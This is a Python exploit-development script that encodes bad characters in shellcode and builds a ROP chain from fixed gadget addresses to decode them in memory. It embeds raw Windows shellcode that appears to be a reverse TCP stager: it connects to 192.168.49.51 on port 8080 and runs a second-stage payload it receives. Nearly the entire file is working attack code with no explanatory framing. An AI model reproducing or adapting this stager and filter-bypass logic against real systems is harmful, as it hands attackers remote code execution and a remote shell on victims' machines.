#!/usr/bin/python
import socket
import sys
from struct import pack


# BAD CHARS: x00, x0a, x11, x20, x28(first occurence only), x80, x81, x86
bad_chars = b"\x00\x0a\x20\x80"

# finds all occurences of provided bad characters and returns a list of their indeces
def map_bad_chars(sc, bad_chars):
    i = 0
    bad_indeces = []
    for i in range(len(sc)):
        for c in bad_chars:
            if sc[i] == c:
                bad_indeces.append(i)
    return bad_indeces


# replaces bad characters in shellcode with characters listed in replare_chars
def encode_shellcode(sc, bad_chars):
    replace_chars = b"\x02\x0c\x22\x82"
    encoded_sc = sc
    for i in range(len(bad_chars)):
        encoded_sc = encoded_sc.replace(pack("B", bad_chars[i]), pack("B", replace_chars[i]))
    return encoded_sc

def decode_shellcode_rop(sc, bad_indeces, bad_chars):
    print(bad_indeces)
    print(sc)
    # add_chars = b"\xfe\xfe\xfe\xfe" 
    decoder_rop = b""
    decoder_rop += pack('<L', 0x741eda54) # pop ebx 
    decoder_rop += pack('<L', 0x414141fe) # value for pop (0xfe will be added to the bad bytes)
    for i in range(len(bad_indeces)):
        if i == 0:
            offset = bad_indeces[i]
        else:
            offset = bad_indeces[i] - bad_indeces[i-1]
        offset = (-offset) & 0xffffffff
        # value = 0
        #for j in range(len(bad_chars)):
            #if sc[bad_indeces[i]] == bad_chars[j]:
                # value = add_chars[j]
        #value = value | 0x11111100
        # increase shellcode pointer to next bad char (eax holds start of shellcode)
        if offset == 0xffffffff:
            decoder_rop +=  pack('<L', 0x741f475d) # inc ecx
        elif offset == 0xfffffffd:
            decoder_rop +=  pack('<L', 0x742a3817) # add eax, 0x02
            decoder_rop +=  pack('<L', 0x741f475d) # inc ecx
        else:
            decoder_rop += pack('<L', 0x741f56a4) # pop ecx
            decoder_rop += pack('<L', offset) # offset to next bad char for pop
            decoder_rop += pack('<L', 0x742233a7) # neg eax
            decoder_rop += pack('<L', 0x7421feed) # add eax, ecx
            decoder_rop += pack('<L', 0x742233a7) # neg eax
        # pop in val of encoded byte - original byte (only low byte matters), add to byte at shellcode
        # decoder_rop += pack('<L', 0x741eda54) # pop ebx 
        # decoder_rop += pack('<L', value) # value for pop (ex. x01+xff = x00)
        decoder_rop += pack('<L', 0x7412c3eb) # add byte [eax], bl
    return decoder_rop



shellcode =  b""
shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
shellcode += b"\x52\x30\x8b\x52\x0c\x89\xe5\x8b\x52\x14\x31"
shellcode += b"\xff\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xc0\xac"
shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
shellcode += b"\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01"
shellcode += b"\xd0\x57\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
shellcode += b"\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3\x85\xc9"
shellcode += b"\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31"
shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
shellcode += b"\x0a\x68\xc0\xa8\x31\x33\x68\x02\x00\x1f\x90"
shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
shellcode += b"\xff\xd5"
